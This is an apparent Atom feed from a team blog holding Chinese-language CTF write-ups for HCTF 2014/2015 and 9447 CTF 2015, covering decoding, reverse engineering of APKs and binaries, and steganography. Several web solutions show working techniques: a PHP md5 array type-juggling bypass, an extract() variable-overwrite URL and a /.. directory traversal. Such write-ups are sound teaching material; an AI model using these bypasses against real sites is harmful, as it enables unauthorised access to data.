<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>watch0ut Notebook</title>
  <subtitle>echo &quot;TXIuQ2VuZytHcmVhdFlZWCtKYWNrUGFuPXdhdGNoMHV0LCBhIHRlYW0gb2YgMyBjb21wdXRlciBnZWVrcy4&quot; | base64 -d</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.watch0ut.com/"/>
  <updated>2015-12-08T06:27:58.000Z</updated>
  <id>http://blog.watch0ut.com/</id>
  
  <author>
    <name>watch0ut</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HCTF 2015 Write-ups</title>
    <link href="http://blog.watch0ut.com/2015/12/08/HCTF-2015-Write-ups/"/>
    <id>http://blog.watch0ut.com/2015/12/08/HCTF-2015-Write-ups/</id>
    <published>2015-12-07T16:20:45.000Z</published>
    <updated>2015-12-08T06:27:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="404"><a href="#404" class="headerlink" title="404"></a>404</h2><p>咦，404了 <a href="http://120.26.93.115:12340/3d9d48dc016f0417558ff26d82ec13cc/webI.php" target="_blank" rel="external">http://120.26.93.115:12340/3d9d48dc016f0417558ff26d82ec13cc/webI.php</a> 奖励金币：50</p>
<p>刚开始用<code>Chrome</code>没抓到跳转之前的页面，后来用<code>Wireshark</code>抓包得到：<br><figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 <span class="number">302</span> Moved Temporarily</div><div class="line"><span class="attribute">Server</span>: nginx</div><div class="line"><span class="attribute">Date</span>: Sat, 05 Dec 2015 06:29:32 GMT</div><div class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</div><div class="line"><span class="attribute">Transfer-Encoding</span>: chunked</div><div class="line"><span class="attribute">Connection</span>: keep-alive</div><div class="line"><span class="attribute">X-Powered-By</span>: PHP/5.6.14</div><div class="line"><span class="attribute">location</span>: ./webl.php</div><div class="line"><span class="attribute">flag</span>: hctf&#123;w3lcome_t0_hc7f_f4f4f4&#125;</div></pre></td></tr></table></figure></p>
<p>Flag： <code>hctf{w3lcome_t0_hc7f_f4f4f4}</code></p>
<h2 id="fuck"><a href="#fuck" class="headerlink" title="fuck ==="></a>fuck ===</h2><p><a href="http://120.26.93.115:18476/eff52083c4d43ad45cc8d6cd17ba13a1/index.php" target="_blank" rel="external">http://120.26.93.115:18476/eff52083c4d43ad45cc8d6cd17ba13a1/index.php</a> 奖励金币：150</p>
<p>访问可得到源码，审计后是若类型判断：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">http:<span class="comment">//120.26.93.115:18476/eff52083c4d43ad45cc8d6cd17ba13a1/index.php?a[]=0&amp;b[]=1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</div><div class="line">    	<span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) === md5($_GET[<span class="string">'b'</span>]))</div><div class="line">        	<span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">print</span> <span class="string">'Wrong.'</span>;</div><div class="line">Flag: hctf&#123;dd0g_fjdks4r3wrkq7jl&#125;</div></pre></td></tr></table></figure></p>
<p>Flag：<code>hctf{dd0g_fjdks4r3wrkq7jl}</code>。</p>
<h2 id="Andy"><a href="#Andy" class="headerlink" title="Andy"></a>Andy</h2><p>Andy的通关密码（flag形式不是hctf{xxx}，提交时请以hctf{flag}的形式提交。） 奖励金币：200 <a href="http://120.26.60.159/Andy/Andy.apk.e48a7af65dba9b45aa8c979488f2665f" target="_blank" rel="external">http://120.26.60.159/Andy/Andy.apk.e48a7af65dba9b45aa8c979488f2665f</a></p>
<p>拖进<code>jeb</code>后，反编译，看代码，发现先是加上<code>hdu1s8</code>逆向，然后<code>base64编码</code>，最后替换加密。用<code>Python</code>实现解密过程：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line">array1 = <span class="string">"0 1 2 3 4 5 6 7 8 9 a b c d e f g h i j k l m n o p q r s t u v w x y z = A B C D E F G H I J K L M E O P Q R S T U V W X Y Z"</span></div><div class="line">array2 = <span class="string">"W,p,X,4,5,B,q,A,6,a,V,3,r,b,U,s,E,d,C,c,D,0,t,T,Y,v,9,Q,2,e,8,P,f,h,J,N,g,u,K,k,H,x,L,w,R,I,j,i,y,l,m,S,M,1,0,O,n,2,G,7,=,F,Z"</span></div><div class="line"></div><div class="line">a1 = array1.split(<span class="string">' '</span>)</div><div class="line">a2 = array2.split(<span class="string">','</span>)</div><div class="line">a_len = len(a1)</div><div class="line"></div><div class="line">cs = <span class="string">'SRlhb70YZHKvlTrNrt08F=DX3cdD3txmg'</span></div><div class="line">ms = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cs:</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(a_len):</div><div class="line">        <span class="keyword">if</span> c == a2[i]:</div><div class="line">            ms += a1[i]</div><div class="line"><span class="keyword">print</span> ms</div><div class="line">ms = ms.replace(<span class="string">'l'</span>, <span class="string">''</span>)</div><div class="line">lens = len(ms)</div><div class="line">lenx = lens - (lens % <span class="number">4</span> <span class="keyword">if</span> lens % <span class="number">4</span> <span class="keyword">else</span> <span class="number">4</span>)</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    ms = base64.decodestring(ms[:lenx])</div><div class="line"><span class="keyword">except</span>:</div><div class="line">    <span class="keyword">pass</span></div><div class="line">ms = ms[::<span class="number">-1</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">'Flag: hctf&#123;%s&#125;'</span> % ms[:<span class="number">-6</span>]</div></pre></td></tr></table></figure></p>
<p>得到Flag：<code>hctf{and8n6yandr3w2i0d}</code>。</p>
<h2 id="What-Is-This"><a href="#What-Is-This" class="headerlink" title="What Is This"></a>What Is This</h2><p>这到底是啥东西？玩玩看？ <a href="http://120.26.60.159/WhatIsThis/what-is-this.1de34c86acc47e2c12dce7eb78226d0d" target="_blank" rel="external">http://120.26.60.159/WhatIsThis/what-is-this.1de34c86acc47e2c12dce7eb78226d0d</a> flag为非标准形式。 奖励金币：200</p>
<p>下载文件后查看格式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file what-is-this</div><div class="line">what-is-this: iNES ROM dump, 8x16k PRG, 0x8k CHR, [Vert.]</div></pre></td></tr></table></figure></p>
<p>然后去网上找NES模拟器，加载后发现好熟悉的画面，小时候玩过的游戏 :smiley: ，进去玩的时候发现有无限条命，索性就玩到通关了 :joy: ，后面有一段是：</p>
<p><img src="/images/HCTF-2015-Write-ups/what-is-this.jpg" alt="what-is-this"><br>有个字母被挡住了，脑补后：<code>ILOVENESFUCKYOUHCGORSA</code>。</p>
<blockquote>
<p>后来看别人的write-up，才知道有金手指这东西，可以直接通关 :sob: 。</p>
</blockquote>
<h2 id="Personal-blog"><a href="#Personal-blog" class="headerlink" title="Personal blog"></a>Personal blog</h2><p>小学弟在大黑客的帮助下，搭建了自己的个人博客. <a href="http://404.hack123.pw/" target="_blank" rel="external">http://404.hack123.pw/</a> 奖励金币：200</p>
<p>去页面找，最后找到一个登录页面：<br><figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">http://404.hack123.pw/2015/05/20/hello-world/</span></div></pre></td></tr></table></figure></p>
<p>查看源码发现一段js，并没有提交。手动提交，查看相应，发现<code>server</code>是<code>Github.com</code>，去<code>Github</code>上搜<code>LoRexxar</code>，搜到一个<code>repository</code>，<br>找到<code>here is f10g.html</code>文件，内容如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">aGN0ZntIM3hvX0Ixb2dfSXNfTml1OGlfQjFvZ30=</div><div class="line"></div><div class="line">enjoy H（0.0）C（0.0）T（0.0）F!</div><div class="line"></div><div class="line">hava fun</div></pre></td></tr></table></figure></p>
<p><code>base64</code>解码后：<code>hctf{H3xo_B1og_Is_Niu8i_B1og}</code>。</p>
<h2 id="送分要不要？（萌新点我）"><a href="#送分要不要？（萌新点我）" class="headerlink" title="送分要不要？（萌新点我）"></a>送分要不要？（萌新点我）</h2><p>题目描述：这题还需要描述么？<br><a href="http://120.26.60.159/EasyMisc/misc50.28c1c3807a6e3ff9da28b5774dc6fbb0" target="_blank" rel="external">http://120.26.60.159/EasyMisc/misc50.28c1c3807a6e3ff9da28b5774dc6fbb0</a><br>分值：50<br>开题金币：50<br>奖励金币：100</p>
<p>一开始思路错了，执行<code>file</code>命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file misc50.28c1c3807a6e3ff9da28b5774dc6fbb0</div><div class="line">misc50.28c1c3807a6e3ff9da28b5774dc6fbb0: Zip archive data, at least v2.0 to extract</div></pre></td></tr></table></figure></p>
<p>知道是<code>zip</code>文件，直接解压，对解压出的图片各种看，就是啥也没找到，后来直接对<code>misc50</code>文件操作：<br><figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ strings misc50.28c1c3807a6e3ff9da28b5774dc6fbb0</div><div class="line">WvJGJ6</div><div class="line">flag.jpg</div><div class="line">...</div><div class="line">WvJGJ6</div><div class="line">flag.jpg</div><div class="line">R1k0RE1NWlhHUTNETU4yQ0daQ1RNUkpUR0UzVEdOUlRHVkRETVFaWEdNMlVNTlpUR01ZREtSUlRHTVpUSU5aVEc0NFRFTUpYSVE9PT09PT0</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>那一长串貌似是<code>base64</code>编码的，解码试试：<br><figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="string">"R1k0RE1NWlhHUTNETU4yQ0daQ1RNUkpUR0UzVEdOUlRHVkRETVFaWEdNMlVNTlpUR01ZREtSUlRHTVpUSU5aVEc0NFRFTUpYSVE9PT09PT0"</span> | base64 <span class="_">-d</span></div><div class="line">GY4DMMZXGQ3DMN2CGZCTMRJTGE3TGNRTGVDDMQZXGM2UMNZTGMYDKRRTGMZTINZTG44TEMJXIQ======</div></pre></td></tr></table></figure></p>
<p>由于比赛时不知道还有<code>base32</code>这个编码方式，比赛后才知道的，解码后如下：<br><figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">686374667B6E6E3173635F6C735F73305F33347379217D</div></pre></td></tr></table></figure></p>
<p>一看就是十六进制的<code>ASCII码</code>，解码得：<code>hctf{nn1sc_ls_s0_34sy!}</code>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;404&quot;&gt;&lt;a href=&quot;#404&quot; class=&quot;headerlink&quot; title=&quot;404&quot;&gt;&lt;/a&gt;404&lt;/h2&gt;&lt;p&gt;咦，404了 &lt;a href=&quot;http://120.26.93.115:12340/3d9d48dc016f0417558ff26
    
    </summary>
    
      <category term="CTF" scheme="http://blog.watch0ut.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://blog.watch0ut.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>9447 CTF 2015 Write-ups</title>
    <link href="http://blog.watch0ut.com/2015/11/29/9447-CTF-2015-Write-ups/"/>
    <id>http://blog.watch0ut.com/2015/11/29/9447-CTF-2015-Write-ups/</id>
    <published>2015-11-29T13:35:32.000Z</published>
    <updated>2015-11-29T13:36:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Reverse-engineering"><a href="#Reverse-engineering" class="headerlink" title="Reverse engineering"></a>Reverse engineering</h1><h2 id="flag-finder-1pts"><a href="#flag-finder-1pts" class="headerlink" title="flag finder (1pts)"></a>flag finder (1pts)</h2><p>I’ve forgotten my flag. I remember it has the format <code>9447{&lt;some string&gt;}</code>, but what could it be?</p>
<p>This task is sadly broken (it is too easy).</p>
<p>直接运行就得<code>flag</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># ./flagfinder</div><div class="line">Try again</div><div class="line">9447&#123;C0ngr47ulaT1ons_p4l_buddy_y0Uv3_solved_the_H4LT1N6_prObL3M_n1c3_&#125; 1000024</div></pre></td></tr></table></figure></p>
<h2 id="The-real-flag-finder-70pts"><a href="#The-real-flag-finder-70pts" class="headerlink" title="The real flag finder (70pts)"></a>The <em>real</em> flag finder (70pts)</h2><p>I’ve forgotten my flag. I remember it has the format “9447{<some string="">}”, but what could it be?</some></p>
<p>Unfortunately the program no longer just prints the flag.</p>
<p>由上一题知道，整个循环在<code>1000024</code>此后结束，把整个过程用<code>Python</code>实现一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">data = [0x32, 0x4A, 0xDB, 0xA5, 0xDB, 0x0D, 0x31, 0x54, 0xD4, 0x41, 0xF1, 0x89, 0x97, 0xE3, 0x4F, 0xD9,</div><div class="line">        0xF2, 0xED, 0x0B, 0xFF, 0xC9, 0xE3, 0x4B, 0xE1, 0x6A, 0x1A, 0x1B, 0xDA, 0x05, 0xAC, 0xE7, 0x82,</div><div class="line">        0x73, 0x20, 0xDF, 0x5B, 0x27, 0x5F, 0xA5, 0x95, 0xDC, 0xD5, 0xBD, 0x1A, 0xC7, 0xAB, 0x9A, 0x0E,</div><div class="line">        0x5E, 0x1B, 0xF5, 0x1D, 0x41, 0xDD, 0x43, 0xAC, 0x4D, 0x2A, 0x34, 0x2E, 0xBC, 0x7A, 0x6C, 0x37,</div><div class="line">        0x9C, 0x4C, 0x87, 0xCD, 0xE2, 0x4C]</div><div class="line">data_len = 70</div><div class="line">data_80 = 0x19660D</div><div class="line">data_84 = 0x3C6EF35F</div><div class="line">data_88 = 0x1571</div><div class="line"></div><div class="line">i = 0</div><div class="line">while True:</div><div class="line">    data_88 = data_88 * data_80 + data_84</div><div class="line">    c = (data_88 &amp; 0xFF00) &gt;&gt; 8</div><div class="line">    data_88 &amp;= 0xFFFFFFFFFFFFFFFF</div><div class="line">    data[i % data_len] = c ^ data[i % data_len]</div><div class="line">    i += 1</div><div class="line">    if i &gt; 1000024:</div><div class="line">        break</div><div class="line">print &apos;The flag is:&apos;, &apos;&apos;.join(chr(d) for d in data)</div></pre></td></tr></table></figure></p>
<blockquote>
<p>要考虑到data_88在C下会溢出，而在Python下就不会，后面计算会耗时很长，所以这里要做溢出处理。</p>
</blockquote>
<p>运行得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">9447&#123;C0ngr47ulaT1ons_p4l_buddy_y0Uv3_solved_the_re4l__H4LT1N6_prObL3M&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sanutf8y-check-1pts"><a href="#sanutf8y-check-1pts" class="headerlink" title="sanutf8y_check (1pts)"></a>sanutf8y_check (1pts)</h2><p>Visit <a href="http://sanutf8y-check-n2wisexx.9447.plumbing" target="_blank" rel="external">http://sanutf8y-check-n2wisexx.9447.plumbing</a> for the flag.</p>
<blockquote>
<p>Hint! The flag is in the format 9447{[a-zA-Z0-9_]*}</p>
</blockquote>
<p>访问链接得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">9447&#123;ΤҺiႽ_ⅰЅ_ԝ㏊t_Α_ﬂ‮...&#123;℮kⅠⅬ_skОOⅬ_ɡᴀ</div></pre></td></tr></table></figure></p>
<p>把内容转换成字母加数字，可得flag：<br><code>9447{ThiS_iS_what_A_flAg_LOOks_LIke}</code></p>
<h2 id="YWS-130pts"><a href="#YWS-130pts" class="headerlink" title="YWS (130pts)"></a>YWS (130pts)</h2><p>My friend wrote a cool web server. I’m sure he’s stored some great doxxxs on the website. Can you take a look and report back any interesting things you find?</p>
<p>The web page is at <a href="http://yws-fsiqc922.9447.plumbing" target="_blank" rel="external">http://yws-fsiqc922.9447.plumbing</a></p>
<p>尝试<code>robots.txt</code>文件，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">User-agnet: *</div><div class="line">Disallow: /</div><div class="line">Disallow: /..</div><div class="line">Disallow: .</div><div class="line">Disallow: ..</div><div class="line">Disallow: /work</div><div class="line">Disallow: /imegas/</div><div class="line">Allow: /sounds/pljesus.wav</div></pre></td></tr></table></figure></p>
<p>既然不让搜索引擎看这些目录，那我们就来看看，访问<code>/..</code>目录得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">  &lt;head&gt;</div><div class="line">    &lt;title&gt;Directory listing for /..&lt;/title&gt;</div><div class="line">  &lt;/head&gt;</div><div class="line">  &lt;body&gt;</div><div class="line">    &lt;h2&gt;Directory listing for /..&lt;/h2&gt;</div><div class="line">    &lt;hr&gt;</div><div class="line">    &lt;ul&gt;</div><div class="line">      &lt;li&gt;</div><div class="line">        &lt;a href=&quot;/../9447&#123;D1rect0ries_ARe_h4rd&#125;&quot;&gt;9447&#123;D1rect0ries_ARe_h4rd&#125;&lt;/a&gt;</div><div class="line">        &lt;li&gt;</div><div class="line">          &lt;a href=&quot;/../.&quot;&gt;.&lt;/a&gt;</div><div class="line">          &lt;li&gt;</div><div class="line">            &lt;a href=&quot;/../..&quot;&gt;..&lt;/a&gt;</div><div class="line">            &lt;li&gt;</div><div class="line">              &lt;a href=&quot;/../gws&quot;&gt;gws&lt;/a&gt;</div><div class="line">              &lt;li&gt;</div><div class="line">                &lt;a href=&quot;/../files&quot;&gt;files&lt;/a&gt;</div><div class="line">              &lt;/ul&gt;</div><div class="line">              &lt;hr&gt;</div><div class="line">            &lt;/body&gt;</div><div class="line">          &lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>flag：<code>9447{D1rect0ries_ARe_h4rd}</code></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Get-help-10pts"><a href="#Get-help-10pts" class="headerlink" title="Get help (10pts)"></a>Get help (10pts)</h2><p>Where would you go to get help?</p>
<p>访问提供的<code>irc</code>，公告如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#9447CTF: Signups for 9447CTF 2015 open at https://9447.plumbing/ - welcome! 9447&#123;Ask_for_help_here&#125; | Hint released for sanutf8y_check | New exploitation released - RedOS</div></pre></td></tr></table></figure></p>
<p>flag：<code>9447{Ask_for_help_here}</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Reverse-engineering&quot;&gt;&lt;a href=&quot;#Reverse-engineering&quot; class=&quot;headerlink&quot; title=&quot;Reverse engineering&quot;&gt;&lt;/a&gt;Reverse engineering&lt;/h1&gt;&lt;h2 i
    
    </summary>
    
      <category term="CTF" scheme="http://blog.watch0ut.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://blog.watch0ut.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>HCTF 2014 Write-ups</title>
    <link href="http://blog.watch0ut.com/2014/11/10/HCTF-2014-Write-ups/"/>
    <id>http://blog.watch0ut.com/2014/11/10/HCTF-2014-Write-ups/</id>
    <published>2014-11-10T13:11:26.000Z</published>
    <updated>2015-11-19T13:42:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="丘比龙的最爱"><a href="#丘比龙的最爱" class="headerlink" title="丘比龙的最爱"></a>丘比龙的最爱</h1><p>丘比龙的最爱传说，丘比龙是丘比特的弟弟，丘比龙是一只小爱神，虽然有两只翅膀，但因为吃多了，导致身体太胖，所以飞不起来~那么问题来了?!丘比龙吃什么食物吃多了变胖了<br>没什么好说的，就是<code>甜甜圈</code>。</p>
<h1 id="nvshen"><a href="#nvshen" class="headerlink" title="nvshen"></a>nvshen</h1><p>猫流大大发现一个女神，你能告诉我女神的名字么（名字即是flag）<br><a href="http://107.189.158.112/0aab9b20410fdd880c53922048023266/nvshen.zip" target="_blank" rel="external">http://107.189.158.112/0aab9b20410fdd880c53922048023266/nvshen.zip</a></p>
<p>下载的文件中有个txt文件，是<code>Base64</code>编码的，初步解码是判断png图片，将编码内容嵌入<code>HTML</code>中，显示一张图片：<br><img src="/images/nvshen.png" alt="女神"><br>google一下，得到女神的名字：<code>爱新觉罗启星</code>。</p>
<h1 id="babyCrack"><a href="#babyCrack" class="headerlink" title="babyCrack"></a>babyCrack</h1><p>107.189.158.112/d55757a7ccf958399789e18e1d8199de/babyCrack.zip</p>
<p>解压后是是一个<code>.Net</code>的<code>exe</code>，直接用<code>.Net Reflector</code>反编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">private void button1_Click(object sender, EventArgs e)</div><div class="line">&#123;</div><div class="line">    bool flag = false;</div><div class="line">    Config.user = this.textBox1.Text;</div><div class="line">    string user = Config.user;</div><div class="line">    string str2 = &quot;hctf&#123;bABy_CtsvlmE_!&#125;&quot;;</div><div class="line">    if (str2.CompareTo(user) == 0)</div><div class="line">    &#123;</div><div class="line">        flag = true;</div><div class="line">    &#125;</div><div class="line">    if (flag)</div><div class="line">    &#123;</div><div class="line">        MessageBox.Show(&quot;good !!!&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>得到flag：<code>hctf{bABy_CtsvlmE_!}</code>。</p>
<h1 id="GIFT"><a href="#GIFT" class="headerlink" title="GIFT"></a>GIFT</h1><p>主办方准备了一个礼物! <a href="http://121.40.86.166:39099" target="_blank" rel="external">http://121.40.86.166:39099</a></p>
<p>访问后，查看源码，提示有<code>index.php.bak</code>，下载后查看源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $flag=&apos;xxx&apos;;</div><div class="line">    extract($_GET);</div><div class="line">    if(isset($gift))&#123;</div><div class="line">        $content=trim(file_get_contents($flag));</div><div class="line">        if($gift==$content)&#123;</div><div class="line">            echo&apos;hctf&#123;...&#125;&apos;;</div><div class="line">        &#125;else&#123;</div><div class="line">            echo&apos;Oh..&apos;;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>根据源码，用<code>get</code>参数将<code>flag</code>的值覆盖，使其是一个 不存在的文件名，然后将<code>gift</code>的内容赋值为空，构造<code>url</code>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://121.40.86.166:39099/?gift=&amp;flag=aaaaa</div></pre></td></tr></table></figure></p>
<p>得到flag：<code>hctf{Awe3ome_Ex7ract!!!}</code>。</p>
<h1 id="babyCrack2"><a href="#babyCrack2" class="headerlink" title="babyCrack2"></a>babyCrack2</h1><p>107.189.158.112/e81cbc49ae92b00d3b55430f21cbe2fe/babyCrack2.zip</p>
<p>IDA反汇编，查看字符串得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">idug|3`5ut`CCbZ`DusnF`34~</div></pre></td></tr></table></figure></p>
<h1 id="Entry"><a href="#Entry" class="headerlink" title="Entry"></a>Entry</h1><p>57R9S980RNOS49973S757PQO9S80Q36P 听说丘比龙一口气能吃”13”个甜甜圈呢!</p>
<p>32位，感觉想MD5，尝试如下对应：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NOPQRS</div><div class="line">ABCDEF</div></pre></td></tr></table></figure></p>
<p>得到<code>57E9F980EABF49973F757CDB9F80D36C</code>，然后破解MD5，得到<code>Qoobee</code></p>
<h1 id="FIND"><a href="#FIND" class="headerlink" title="FIND"></a>FIND</h1><p>Find what？ <a href="http://107.189.158.112/f60a0a6ffd7c297964a718dc21546975/stego_final.png" target="_blank" rel="external">http://107.189.158.112/f60a0a6ffd7c297964a718dc21546975/stego_final.png</a></p>
<p>用神器<code>stego solve</code>分析，得到二维码，直接提取的二维码，我怎么扫都扫不出来，后来Great YYX助攻，用PS处理了下就可以了：<br><img src="/images/FIND-qrcode.jpg" alt="二维码"><br>扫描即可得到flag：<code>flag{hctf_3xF$235#\x5e3}</code></p>
<h1 id="NormalFile"><a href="#NormalFile" class="headerlink" title="NormalFile"></a>NormalFile</h1><p>你能找到其中的深意么？ <a href="http://107.189.158.112/fdd9df21d6c5d65fe519f69f8424d65b/NormalFile.jpg" target="_blank" rel="external">http://107.189.158.112/fdd9df21d6c5d65fe519f69f8424d65b/NormalFile.jpg</a></p>
<p>下载图片，提取出一个zip文件，解压，又有一张图片，又提取出一个apk，反编译apk，分析flag生成过程，一开始没看到half那个字符串，以为答案有多个，随便生成一个，提交发现不对，后来在string.xml找到half才确定，自己用Python实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">num_xor = [112, 83, 93, 112, 28, 0, 87, 91]</div><div class="line">    </div><div class="line">half = &apos;401!n++p&apos;</div><div class="line"></div><div class="line"></div><div class="line">def main():</div><div class="line">    last = &apos;&apos;</div><div class="line">    for i in xrange(0, 8):</div><div class="line">        last += chr(ord(half[i]) ^ num_xor[i])</div><div class="line">    flag = &apos;hctf&#123;&apos; + half[0] + half[4] + last[0] + last[4] + half[1] + half[2] \</div><div class="line">           + last[1] + last[2] + half[2] + half[1] + last[2] + last[6] + half[3] \</div><div class="line">           + half[7] + last[3] + half[7] + &apos;&#125;&apos;</div><div class="line">    print flag</div></pre></td></tr></table></figure></p>
<p>运行得到flag：<code>hctf{4nDr01cl10l|!pQp}</code>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;丘比龙的最爱&quot;&gt;&lt;a href=&quot;#丘比龙的最爱&quot; class=&quot;headerlink&quot; title=&quot;丘比龙的最爱&quot;&gt;&lt;/a&gt;丘比龙的最爱&lt;/h1&gt;&lt;p&gt;丘比龙的最爱传说，丘比龙是丘比特的弟弟，丘比龙是一只小爱神，虽然有两只翅膀，但因为吃多了，导致身体太胖，所以
    
    </summary>
    
      <category term="CTF" scheme="http://blog.watch0ut.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://blog.watch0ut.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>XD CTF 2014 Write-ups</title>
